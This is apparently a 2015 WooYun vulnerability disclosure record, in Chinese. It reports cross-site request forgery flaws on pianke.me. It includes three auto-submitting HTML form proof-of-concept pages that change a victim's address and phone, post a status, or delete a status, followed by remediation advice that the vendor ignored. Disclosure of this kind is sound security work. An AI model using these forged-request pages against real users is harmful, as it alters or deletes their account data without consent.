{"id": 69865, "wybug_id": "wooyun-2015-0144599", "wybug_title": "片刻网全站点多处设计缺陷导致跨站请求伪造（批量CSRF打包提交）", "wybug_corp": "pianke.me", "wybug_author": "安然意境", "wybug_date": "2015-10-05 13:28", "wybug_open_date": "2015-10-13 09:00", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["批量", "打包", "批量提交"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 片刻网全站点多处设计缺陷导致跨站请求伪造（批量CSRF打包提交） 详细说明：  片刻网全站点多处设计缺陷导致跨站请求伪造（批量CSRF打包提交）之前报送的CSRF到现在还没有修复，请厂商重视。1.http://pianke.me/api/user/setaddre.php本接口可以更改用户默认联系方式，收货地址等。\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"><title>CSRF跨站请求伪造安全漏洞POC</title></head><body><form action=\"http://pianke.me/api/user/setaddre.php\" method=\"post\"><input type=\"hidden\" name=\"name\" value=\"csrftest\"/><input type=\"hidden\" name=\"phone\" value=\"00000000\"/><input type=\"hidden\" name=\"zipcode\" value=\"300000\"/><input type=\"hidden\" name=\"addre\" value=\"00000000000000000\"/><input type=\"hidden\" name=\"desc\" value=\"0000000\"/></form><script>  document.forms[0].submit();</script> </body></html>\n2.http://pianke.me/api/timeline/addtalk.php可发布个人状态更新。\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"><title>CSRF跨站请求伪造安全漏洞POC</title></head><body><form action=\"http://pianke.me/api/timeline/addtalk.php\" method=\"post\"><input type=\"hidden\" name=\"content\" value=\"csrftest\"/><input type=\"hidden\" name=\"color\" value=\"firstid\"/><input type=\"hidden\" name=\"560f1d365e7743002e8b4660\" value=\"firstday\"/></form><script>  document.forms[0].submit();</script> </body></html>\n3.http://pianke.me/api/timeline/deltalk.php可以通过在网页上公开的contentid来指定用户删除某条状态。\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"><title>CSRF跨站请求伪造安全漏洞POC</title></head><body><form action=\"http://pianke.me/api/timeline/deltalk.php\" method=\"post\"><input type=\"hidden\" name=\"contentid\" value=\"560f1ead5d77437b3c8b4748\"/></form><script>  document.forms[0].submit();</script> </body></html>\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  以上均为敏感操作的CSRF列举，由于测试时间有限，建议厂商能够完整查验更多的请求（无论敏感操作或非敏感操作），建议全站点配置Anti CSRF Token及Referer Check.部分特别敏感的操作建议引入验证码。验证码被认为是对抗CSRF攻击最简洁有效的防御方法。   版权声明：转载请注明来源 安然意境@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-13 09:00 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}